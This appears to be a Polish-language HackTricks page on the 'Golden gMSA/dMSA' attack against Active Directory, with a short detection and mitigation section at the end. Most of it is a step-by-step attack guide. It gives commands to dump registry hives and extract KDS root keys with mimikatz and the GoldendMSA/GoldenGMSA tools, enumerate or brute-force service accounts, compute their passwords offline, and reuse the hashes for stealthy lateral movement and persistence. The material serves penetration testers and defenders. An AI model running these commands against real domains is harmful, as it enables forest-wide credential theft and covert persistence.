# Golden gMSA/dMSA Attack (Offline Derivation of Managed Service Account Passwords)

{{#include ../../banners/hacktricks-training.md}}

## Przegląd

Windows Managed Service Accounts (MSA) to specjalne principals przeznaczone do uruchamiania usług bez konieczności ręcznego zarządzania ich hasłami.
Istnieją dwa główne warianty:

1. **gMSA** – group Managed Service Account – może być używane na wielu hostach autoryzowanych w jego atrybucie `msDS-GroupMSAMembership`.
2. **dMSA** – delegated Managed Service Account – będące (obecnie w fazie preview) następcą gMSA, opierające się na tej samej kryptografii, ale umożliwiające bardziej granularne scenariusze delegowania.

W przypadku obu wariantów **hasło nie jest przechowywane** na każdym Domain Controllerze (DC) jako zwykły NT-hash. Zamiast tego każdy DC może **wyprowadzić** bieżące hasło na żądanie z:

* obejmującego cały forest **KDS Root Key** (`KRBTGT\KDS`) – losowo wygenerowany sekret nazwany GUID-em, replikowany do każdego DC w kontenerze `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …`.
* SID docelowego konta.
* przypisanego do konta **ManagedPasswordID** (GUID), znajdującego się w atrybucie `msDS-ManagedPasswordId`.

Proces wyprowadzania wygląda następująco: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → 240-bajtowy blob, który jest następnie **kodowany w base64** i zapisywany w atrybucie `msDS-ManagedPassword`.
Podczas standardowego użycia hasła nie jest wymagany ruch Kerberos ani interakcja z domeną – host członkowski wyprowadza hasło lokalnie, o ile zna te trzy dane wejściowe.

## Golden gMSA / Golden dMSA Attack

Jeśli attacker zdobędzie wszystkie trzy dane wejściowe **offline**, może obliczyć **prawidłowe bieżące i przyszłe hasła** dla **dowolnego gMSA/dMSA w forest**, bez ponownego kontaktowania się z DC, omijając:<sup>[[1]](#references)[[2]](#references)</sup>

* audyt odczytów LDAP
* interwały zmiany haseł (hasła mogą zostać obliczone z wyprzedzeniem)

Jest to analogiczne do *Golden Ticket* dla kont usługowych.<sup>[[1]](#references)[[2]](#references)</sup>

### Wymagania wstępne

1. **Kompromitacja na poziomie forest** jednego DC (lub Enterprise Admin) albo dostęp `SYSTEM` do jednego z DC w forest.
2. Możliwość enumeracji kont usługowych (odczyt LDAP / RID brute-force).
3. Stacja robocza .NET ≥ 4.7.2 x64 do uruchomienia [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) lub równoważnego kodu.

### Golden gMSA / dMSA
#### Faza 1 – Wyodrębnienie KDS Root Key

Zrzut z dowolnego DC (Volume Shadow Copy / surowe ule SAM+SECURITY albo zdalne sekrety):<sup>[[1]](#references)[[2]](#references)</sup>
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too

# With GoldendMSA
GoldendMSA.exe kds --domain <domain name>   # query KDS root keys from a DC in the forest
GoldendMSA.exe kds

# With GoldenGMSA
GoldenGMSA.exe kdsinfo
```
Ciąg base64 oznaczony jako `RootKey` (nazwa GUID) jest wymagany w późniejszych krokach.<sup>[[1]](#references)[[2]](#references)</sup>

##### Faza 2 – Enumeracja obiektów gMSA / dMSA

Pobierz co najmniej `sAMAccountName`, `objectSid` oraz `msDS-ManagedPasswordId`:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId

GoldenGMSA.exe gmsainfo
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) implementuje tryby pomocnicze:<sup>[[1]](#references)</sup>
```bash
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
##### Faza 3 – Guess / Discover the ManagedPasswordID (when missing)

Niektóre wdrożenia *usuwają* `msDS-ManagedPasswordId` z odczytów chronionych przez ACL.  
Ponieważ GUID ma długość 128 bitów, naiwne bruteforce jest niewykonalne, ale:

1. Pierwsze **32 bity = czas epoki Unix** utworzenia konta (z dokładnością do minut).
2. Następne 96 bitów to losowe dane.

Dlatego **wąska wordlist dla każdego konta** (± kilka godzin) jest realistyczna.
```bash
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
Narzędzie oblicza hasła kandydujące i porównuje ich blob base64 z rzeczywistym atrybutem `msDS-ManagedPassword` – dopasowanie ujawnia prawidłowy GUID.

##### Faza 4 – Obliczanie i konwersja hasła offline

Gdy znany jest ManagedPasswordID, prawidłowe hasło można uzyskać za pomocą jednego polecenia:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
```
Wynikowe hashe można wstrzyknąć za pomocą **mimikatz** (`sekurlsa::pth`) lub **Rubeus** w celu nadużycia Kerberos, umożliwiając ukryte **lateral movement** i **persistence**.

## Wykrywanie i ograniczanie skutków

* Ogranicz możliwości **backupu DC i odczytu rejestru hive** do administratorów Tier-0.
* Monitoruj tworzenie **Directory Services Restore Mode (DSRM)** lub **Volume Shadow Copy** na DC.
* Audytuj odczyty / zmiany w `CN=Master Root Keys,…` oraz flagach `userAccountControl` kont usługowych.
* Wykrywaj nietypowe **zapisy haseł base64** lub nagłe ponowne użycie haseł usług na wielu hostach.
* Rozważ konwersję uprzywilejowanych kont gMSA na **klasyczne konta usługowe** z regularną rotacją losowych haseł tam, gdzie izolacja Tier-0 nie jest możliwa.

## Narzędzia

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – implementacja referencyjna użyta na tej stronie.<sup>[[3]](#references)</sup>
* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – implementacja referencyjna użyta na tej stronie.
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – pass-the-ticket z użyciem wyprowadzonych kluczy AES.

## Odniesienia

- [1] [Golden dMSA – authentication bypass for delegated Managed Service Accounts](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [2] [gMSA Active Directory Attacks Accounts](https://www.semperis.com/blog/golden-gmsa-attack/)
- [3] [Semperis/GoldenDMSA GitHub repository](https://github.com/Semperis/GoldenDMSA)

{{#include ../../banners/hacktricks-training.md}}
